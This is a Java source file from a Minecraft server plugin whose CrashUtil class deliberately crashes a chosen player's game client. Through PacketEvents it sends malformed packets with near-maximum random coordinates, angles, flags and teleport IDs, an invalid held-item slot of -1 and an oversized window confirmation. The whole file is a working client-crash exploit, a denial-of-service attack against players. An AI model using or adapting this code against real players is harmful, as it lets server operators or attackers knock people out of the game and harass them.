package cn.ChengZhiYa.MHDFTools.util.feature;

import cn.ChengZhiYa.MHDFTools.Main;
import com.github.retrooper.packetevents.protocol.particle.Particle;
import com.github.retrooper.packetevents.protocol.particle.type.ParticleTypes;
import com.github.retrooper.packetevents.util.Vector3d;
import com.github.retrooper.packetevents.util.Vector3f;
import com.github.retrooper.packetevents.wrapper.play.server.*;
import org.bukkit.entity.Player;

import java.util.Collections;

public final class CrashUtil {
    /**
     * 崩溃指定玩家实例的客户端
     *
     * @param player    玩家实例
     * @param crashType 崩溃类型
     * @return 崩溃类型是否存在
     */
    public static boolean crashPlayerClient(Player player, String crashType) {
        switch (crashType) {
            case "explosion" -> {
                Main.instance.getPluginHookManager().getPacketEventsHook().sendPacket(player,
                        new WrapperPlayServerExplosion(
                                new Vector3d(generateInvalidPosition(), generateInvalidPosition(), generateInvalidPosition()),
                                generateInvalidLook(),
                                Collections.emptyList(),
                                new Vector3f(generateInvalidLook(), generateInvalidLook(), generateInvalidLook())
                        )
                );
                Main.instance.getPluginHookManager().getPacketEventsHook().sendPacket(player,
                        new WrapperPlayServerWindowConfirmation(
                                Float.MAX_EXPONENT,
                                Short.MAX_VALUE,
                                false)
                );
            }
            case "changeHoldItem" -> Main.instance.getPluginHookManager().getPacketEventsHook().sendPacket(player,
                    new WrapperPlayServerHeldItemChange(-1)
            );
            case "posAndLook" -> Main.instance.getPluginHookManager().getPacketEventsHook().sendPacket(player,
                    new WrapperPlayServerPlayerPositionAndLook(
                            generateInvalidPosition(), generateInvalidPosition(), generateInvalidPosition(),
                            generateInvalidLook(), generateInvalidLook(),
                            generateFlags(), generateTeleportID(), false
                    )
            );
            case "invalidParticle" -> Main.instance.getPluginHookManager().getPacketEventsHook().sendPacket(player,
                    new WrapperPlayServerParticle(
                            new Particle<>(ParticleTypes.DRAGON_BREATH), true,
                            new Vector3d(generateInvalidPosition(), generateInvalidPosition(), generateInvalidPosition()),
                            new Vector3f(generateInvalidLook(), generateInvalidLook(), generateInvalidLook()),
                            generateInvalidLook(), generateTeleportID()
                    )
            );
            default -> {
                return false;
            }
        }
        return true;
    }

    /**
     * 构建无效的坐标
     *
     * @return 坐标
     */
    private static double generateInvalidPosition() {
        double baseValue = Double.MAX_VALUE;
        double randomFactor = Math.random();
        return baseValue * (randomFactor * (Math.sqrt(randomFactor) * 564.0 % 1.0 * 0.75 - Math.pow(randomFactor, 2.0) % 1.0 * 0.5) + 0.5);
    }

    /**
     * 构建无效的角度
     *
     * @return 角度
     */
    private static float generateInvalidLook() {
        float baseValue = Float.MAX_VALUE;
        double randomFactor = Math.random();
        return baseValue * (float) (randomFactor * (Math.sqrt(randomFactor) * 564.0 % 1.0 * 0.75 - Math.pow(randomFactor, 2.0) % 1.0 * 0.5) + 0.5);
    }

    /**
     * 构建无效的向量实例
     *
     * @return 向量实例
     */
    private static Vector3f generateInvalidLookVector() {
        float invalidLook = generateInvalidLook();
        return new Vector3f(invalidLook, invalidLook, invalidLook);
    }

    /**
     * 构建标签
     *
     * @return 标签
     */
    private static byte generateFlags() {
        int maxValue = 127;
        double randomFactor = Math.random();
        return (byte) (maxValue * (randomFactor * (Math.sqrt(randomFactor) * 564.0 % 1.0 * 0.75 - Math.pow(randomFactor, 2.0) % 1.0 * 0.5) + 0.5));
    }

    /**
     * 构建传送ID
     *
     * @return 传送ID
     */
    private static int generateTeleportID() {
        int maxValue = Integer.MAX_VALUE;
        double randomFactor = Math.random();
        return (int) (maxValue * (randomFactor * (Math.sqrt(randomFactor) * 564.0 % 1.0 * 0.75 - Math.pow(randomFactor, 2.0) % 1.0 * 0.5) + 0.5));
    }
}
